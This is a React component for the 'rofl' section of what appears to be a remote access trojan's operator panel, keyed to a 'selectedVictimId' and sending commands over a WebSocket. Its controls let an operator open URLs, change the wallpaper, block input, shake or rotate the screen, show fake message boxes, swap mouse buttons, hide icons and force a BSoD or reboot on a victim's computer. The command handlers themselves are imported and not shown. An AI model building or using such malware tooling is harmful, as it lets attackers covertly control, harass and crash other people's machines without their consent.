"use client";

import { useEffect, useState } from "react";
import { useQueryClient } from "@tanstack/react-query";

import { usePanelDetailView } from "../panel-detail-view-provider";
import { usePanelWS } from "../../../ws/ws-provider";
import { bindRoflActions } from "./rofl/bind-rofl-actions";
import { IconSelect } from "./rofl/icon-select";
import { ButtonSelect } from "./rofl/button-select";
import { useDropdownPosition } from "./rofl/use-dropdown-position";
import type { IconOptionValue } from "./rofl/icon-options";
import type { ButtonOptionValue } from "./rofl/button-options";

const CARD =
    "rofl-card w-[420px] max-w-[calc(100vw-420px)] ml-[4px] rounded-[18px] border border-white/[0.14] " +
    "bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]";

const BTN =
    "min-w-[120px] cursor-pointer rounded-[12px] border border-white/[0.12] " +
    "bg-[linear-gradient(180deg,rgba(50,50,55,0.9),rgba(28,28,32,0.95))] " +
    "px-[22px] pb-[6px] pt-[8px] text-[13px] font-[700] uppercase tracking-[0.08em] text-[#e8e8e8] " +
    "shadow-[0_2px_8px_rgba(0,0,0,0.5),inset_0_1px_0_rgba(255,255,255,0.06)] " +
    "transition-all duration-[140ms] ease-out " +
    "hover:-translate-y-[1px] hover:bg-[linear-gradient(180deg,rgba(65,65,70,0.95),rgba(38,38,42,0.98))] " +
    "hover:border-white/[0.22] hover:text-white hover:shadow-[0_6px_20px_rgba(0,0,0,0.6),inset_0_1px_0_rgba(255,255,255,0.1)] " +
    "active:translate-y-[1px] active:shadow-[0_1px_4px_rgba(0,0,0,0.5),inset_0_1px_0_rgba(255,255,255,0.04)]";

export function RoflSection() {
    const detail = usePanelDetailView();
    const ws = usePanelWS();
    const qc = useQueryClient();

    const [iconValue, setIconValue] = useState<IconOptionValue>("info");
    const [buttonValue, setButtonValue] = useState<ButtonOptionValue>("ok");

    const iconDropdown = useDropdownPosition();
    const buttonDropdown = useDropdownPosition();

    useEffect(() => {
        return bindRoflActions({
            selectedVictimId: detail.selectedVictimId,
            qc,
            ws,
        });
    }, [detail.selectedVictimId, qc, ws]);

    return (
        <div className="detail-section h-[100dvh] overflow-y-auto pb-[60px]" data-section="rofl">
            {/* Open URL */}
            <div className={CARD} style={{ marginTop: "8px" }}>
                <div className="p-[6px_2px_2px]">
                    <div className="mb-[4px] text-[18px] font-[800] text-white">Open url</div>
                    <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                    <div className="grid grid-cols-[1fr_max-content] items-stretch gap-[10px]">
                        <input
                            id="roflUrlInput"
                            className="w-full rounded-[10px] border border-white/[0.14] bg-black/40 px-[10px] py-[8px] text-[15px] text-white outline-none placeholder:text-[rgba(200,200,200,0.6)] focus:border-[rgba(220,220,220,0.95)]"
                            placeholder="URL"
                        />
                        <button id="roflOpenBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>
                            Open
                        </button>
                    </div>
                    <div className="mt-[10px] h-[2px] bg-[var(--line)]" />
                </div>
            </div>

            {/* Change background */}
            <div className={CARD} style={{ marginTop: "18px" }}>
                <div className="p-[6px_2px_2px]">
                    <div className="mb-[4px] text-[18px] font-[800] text-white">Change the background</div>
                    <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                    <div className="grid grid-cols-[1fr_max-content] items-stretch gap-[10px]">
                        <input
                            id="roflBgUrlInput"
                            className="w-full rounded-[10px] border border-white/[0.14] bg-black/40 px-[10px] py-[8px] text-[15px] text-white outline-none placeholder:text-[rgba(200,200,200,0.6)] focus:border-[rgba(220,220,220,0.95)]"
                            placeholder="URL"
                        />
                        <button id="roflChangeBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>
                            Change
                        </button>
                    </div>
                    <div className="mt-[10px] h-[2px] bg-[var(--line)]" />
                </div>
            </div>

            {/* Block input */}
            <div className={CARD} style={{ marginTop: "18px" }}>
                <div className="p-[6px_2px_2px]">
                    <div className="mb-[4px] text-[18px] font-[800] text-white">Block input</div>
                    <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                    <div className="flex justify-start gap-[12px]">
                        <button id="roflBlockOnBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>Turn on</button>
                        <button id="roflBlockOffBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>Turn off</button>
                    </div>
                    <div className="mt-[10px] h-[2px] bg-[var(--line)]" />
                </div>
            </div>

            {/* Shake screen */}
            <div className={CARD} style={{ marginTop: "18px" }}>
                <div className="p-[6px_2px_2px]">
                    <div className="mb-[4px] text-[18px] font-[800] text-white">Shake screen</div>
                    <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                    <div className="flex justify-start gap-[12px]">
                        <button id="roflShakeOnBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>Turn on</button>
                        <button id="roflShakeOffBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>Turn off</button>
                    </div>
                </div>
            </div>

            {/* Flip/Rotate Screen */}
            <div className={CARD} style={{ marginTop: "18px" }}>
                <div className="p-[6px_2px_2px]">
                    <div className="mb-[4px] text-[18px] font-[800] text-white">Flip/Rotate Screen</div>
                    <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                    <div className="grid grid-cols-3 gap-[12px]">
                        <button id="roflRotate90Btn" className={BTN} style={{ borderBottom: "4px solid var(--line)", minWidth: 0 }}>90°</button>
                        <button id="roflRotate180Btn" className={BTN} style={{ borderBottom: "4px solid var(--line)", minWidth: 0 }}>180°</button>
                        <button id="roflRotate270Btn" className={BTN} style={{ borderBottom: "4px solid var(--line)", minWidth: 0 }}>270°</button>
                    </div>
                    <div className="mt-[10px]">
                        <button id="roflRotateResetBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>Reset</button>
                    </div>
                </div>
            </div>

            {/* Message box */}
            <div className={CARD} style={{ marginTop: "18px" }}>
                <div className="p-[6px_2px_2px]">
                    <div className="mb-[4px] text-[18px] font-[800] text-white">Message box</div>
                    <div className="mb-[10px] h-[2px] bg-[var(--line)]" />

                    <div className="grid grid-cols-[90px_1fr] items-center gap-[10px] my-[8px]">
                        <div className="text-[14px] font-semibold text-[rgba(235,235,235,0.94)]">Icon:</div>
                        <div className="w-full">
                            <IconSelect
                                value={iconValue}
                                onChange={setIconValue}
                                wrapRef={iconDropdown.wrapRef}
                                btnRef={iconDropdown.btnRef}
                                menuRef={iconDropdown.menuRef}
                                open={iconDropdown.open}
                                setOpen={iconDropdown.setOpen}
                                menuPos={iconDropdown.menuPos}
                            />
                            <input id="roflMsgIcon" type="hidden" value={iconValue} />
                        </div>
                    </div>

                    <div className="grid grid-cols-[90px_1fr] items-center gap-[10px] my-[8px]">
                        <div className="text-[14px] font-semibold text-[rgba(235,235,235,0.94)]">Header:</div>
                        <input
                            id="roflMsgHeader"
                            className="w-full rounded-[10px] border border-white/[0.14] bg-black/40 px-[10px] py-[8px] text-[14px] text-white outline-none placeholder:text-[rgba(200,200,200,0.6)] focus:border-[rgba(220,220,220,0.95)]"
                            placeholder="Header text"
                        />
                    </div>

                    <div className="grid grid-cols-[90px_1fr] items-start gap-[10px] my-[8px]">
                        <div className="pt-[6px] text-[14px] font-semibold text-[rgba(235,235,235,0.94)]">Content:</div>
                        <textarea
                            id="roflMsgContent"
                            rows={3}
                            className="min-h-[72px] max-h-[160px] resize-none rounded-[10px] border border-white/[0.14] bg-black/40 px-[10px] py-[8px] text-[14px] text-white outline-none placeholder:text-[rgba(200,200,200,0.6)] focus:border-[rgba(220,220,220,0.95)]"
                            placeholder="Message content"
                        />
                    </div>

                    <div className="mt-[4px] h-[2px] bg-[var(--line)]" />

                    <div className="mt-[14px] grid grid-cols-[90px_minmax(140px,220px)_max-content] items-center gap-x-[12px] gap-y-[10px]">
                        <div className="text-[14px] font-semibold text-[rgba(235,235,235,0.94)]">Buttons:</div>
                        <ButtonSelect
                            value={buttonValue}
                            onChange={setButtonValue}
                            wrapRef={buttonDropdown.wrapRef}
                            btnRef={buttonDropdown.btnRef}
                            menuRef={buttonDropdown.menuRef}
                            open={buttonDropdown.open}
                            setOpen={buttonDropdown.setOpen}
                            menuPos={buttonDropdown.menuPos}
                        />
                        <input id="roflMsgButtons" type="hidden" value={buttonValue} />
                        <button id="roflMsgSendBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>
                            Send
                        </button>
                    </div>
                </div>
            </div>

            {/* Swap Mouse Buttons */}
            <div className={CARD} style={{ marginTop: "18px" }}>
                <div className="p-[6px_2px_2px]">
                    <div className="mb-[4px] text-[18px] font-[800] text-white">Swap Mouse Buttons</div>
                    <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                    <div className="flex justify-start gap-[12px]">
                        <button id="roflSwapLeftRightBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>Left | Right</button>
                        <button id="roflSwapRightLeftBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>Right | Left</button>
                    </div>
                </div>
            </div>

            {/* Desktop Icons */}
            <div className={CARD} style={{ marginTop: "18px" }}>
                <div className="p-[6px_2px_2px]">
                    <div className="mb-[4px] text-[18px] font-[800] text-white">Desktop Icons</div>
                    <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                    <div className="flex justify-start gap-[12px]">
                        <button id="roflHideIconsBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>Hide</button>
                        <button id="roflShowIconsBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>Show</button>
                    </div>
                </div>
            </div>

            {/* Reboot */}
            <div className={CARD} style={{ marginTop: "18px" }}>
                <div className="p-[6px_2px_2px]">
                    <div className="mb-[4px] text-[18px] font-[800] text-white">Reboot</div>
                    <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                    <div className="flex justify-start gap-[12px]">
                        <button id="roflBsodBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>BSoD</button>
                        <button id="roflVoltageBtn" className={BTN} style={{ borderBottom: "4px solid var(--line)" }}>VOLTAGE DROP</button>
                    </div>
                </div>
            </div>
        </div>
    );
}
